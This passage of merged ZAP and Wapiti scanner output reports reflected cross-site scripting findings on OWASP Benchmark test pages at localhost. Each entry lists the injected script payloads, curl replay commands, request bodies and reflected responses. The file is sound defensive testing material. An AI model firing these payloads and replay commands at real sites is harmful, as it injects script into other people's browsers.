            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00384', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '94', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00384.html?BenchmarkTest00384=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'c2VjdXJlPVpBUCZwcm9kdWN0SUQ9WkFQJmZvbz1mb28mQmVuY2htYXJrVGVzdDAwMzg0PSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRQ=='}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00384', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00384.html', 'content-length': '114', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'secure=default&productID=default&foo=foo&BenchmarkTest00384=%3CScRiPt%3Ealert%28%27wuz909gjli%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:52 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:22:42 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wuz909gjli')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-00/BenchmarkTest00385",
                    "Wapiti - https://localhost:8444/benchmark/xss-00/BenchmarkTest00385?BenchmarkTest00385=SafeText&BenchmarkTest00385=Movies&BenchmarkTest00385=Writing&BenchmarkTest00385=%3CScRiPt%3Ealert%28%27w3u8elcoiy%27%29%3C%2FsCrIpT%3E&foo=bar"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('w3u8elcoiy')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('w3u8elcoiy')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00385\" -e \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00385.html?BenchmarkTest00385=SafeText\" -d \"BenchmarkTest00385=SafeText&BenchmarkTest00385=Movies&BenchmarkTest00385=Writing&BenchmarkTest00385=%3CScRiPt%3Ealert%28%27w3u8elcoiy%27%29%3C%2FsCrIpT%3E&foo=bar\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00385"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00385', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '69', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00385.html?BenchmarkTest00385=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAwMzg1PSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRSZmb289YmFy'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00385', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00385.html?BenchmarkTest00385=SafeText', 'content-length': '81', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest00385=SafeText&BenchmarkTest00385=Movies&BenchmarkTest00385=Writing&BenchmarkTest00385=%3CScRiPt%3Ealert%28%27w3u8elcoiy%27%29%3C%2FsCrIpT%3E&foo=bar'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '49', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:52 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': 'Formatted like: <scrIpt>alert(1);</scRipt> and b.'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '59', 'date': 'Sun, 31 Aug 2025 04:22:50 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"Formatted like: <ScRiPt>alert('w3u8elcoiy')</sCrIpT> and b.\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-00/BenchmarkTest00388",
                    "Wapiti - https://localhost:8444/benchmark/xss-00/BenchmarkTest00388?email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest00388=%3CScRiPt%3Ealert%28%27wr0784ubqd%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wr0784ubqd')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wr0784ubqd')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00388\" -e \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00388.html\" -d \"email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest00388=%3CScRiPt%3Ealert%28%27wr0784ubqd%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00388"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00388', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '102', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00388.html?BenchmarkTest00388=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'ZW1haWw9emFwcm94eSU0MGV4YW1wbGUuY29tJnBhc3N3b3JkPVpBUCZCZW5jaG1hcmtUZXN0MDAzODg9JTNDc2NySXB0JTNFYWxlcnQlMjgxJTI5JTNCJTNDJTJGc2NSaXB0JTNF'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00388', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00388.html', 'content-length': '125', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest00388=%3CScRiPt%3Ealert%28%27wr0784ubqd%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '37', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:52 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>_SafeStuff\\n'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '47', 'date': 'Sun, 31 Aug 2025 04:22:50 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wr0784ubqd')</sCrIpT>_SafeStuff\\n\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-00/BenchmarkTest00390",
                    "Wapiti - https://localhost:8444/benchmark/xss-00/BenchmarkTest00390?BenchmarkTest00390=SafeText&BenchmarkTest00390=Movies&BenchmarkTest00390=Writing&BenchmarkTest00390=%3CScRiPt%3Ealert%28%27wej8bhgp32%27%29%3C%2FsCrIpT%3E&foo=bar"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wej8bhgp32')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wej8bhgp32')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00390\" -e \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00390.html?BenchmarkTest00390=SafeText\" -d \"BenchmarkTest00390=SafeText&BenchmarkTest00390=Movies&BenchmarkTest00390=Writing&BenchmarkTest00390=%3CScRiPt%3Ealert%28%27wej8bhgp32%27%29%3C%2FsCrIpT%3E&foo=bar\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00390"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00390', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '69', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00390.html?BenchmarkTest00390=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAwMzkwPSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRSZmb289YmFy'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00390', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00390.html?BenchmarkTest00390=SafeText', 'content-length': '81', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest00390=SafeText&BenchmarkTest00390=Movies&BenchmarkTest00390=Writing&BenchmarkTest00390=%3CScRiPt%3Ealert%28%27wej8bhgp32%27%29%3C%2FsCrIpT%3E&foo=bar'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '27', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:52 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>\\n'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '37', 'date': 'Sun, 31 Aug 2025 04:23:01 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wej8bhgp32')</sCrIpT>\\n\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-00/BenchmarkTest00395",
                    "Wapiti - https://localhost:8444/benchmark/xss-00/BenchmarkTest00395?BenchmarkTest00395=SafeText&BenchmarkTest00395=Movies&BenchmarkTest00395=Writing&BenchmarkTest00395=%3CScRiPt%3Ealert%28%27wvhjibncb4%27%29%3C%2FsCrIpT%3E&foo=bar"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wvhjibncb4')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wvhjibncb4')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00395\" -e \"https://localhost:8444/benchmark/xss-00/BenchmarkTest00395.html\" -d \"BenchmarkTest00395=SafeText&BenchmarkTest00395=Movies&BenchmarkTest00395=Writing&BenchmarkTest00395=%3CScRiPt%3Ealert%28%27wvhjibncb4%27%29%3C%2FsCrIpT%3E&foo=bar\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00395"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00395', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '69', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00395.html?BenchmarkTest00395=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAwMzk1PSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRSZmb289YmFy'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00395', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-00/BenchmarkTest00395.html', 'content-length': '81', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest00395=SafeText&BenchmarkTest00395=Movies&BenchmarkTest00395=Writing&BenchmarkTest00395=%3CScRiPt%3Ealert%28%27wvhjibncb4%27%29%3C%2FsCrIpT%3E&foo=bar'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:52 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
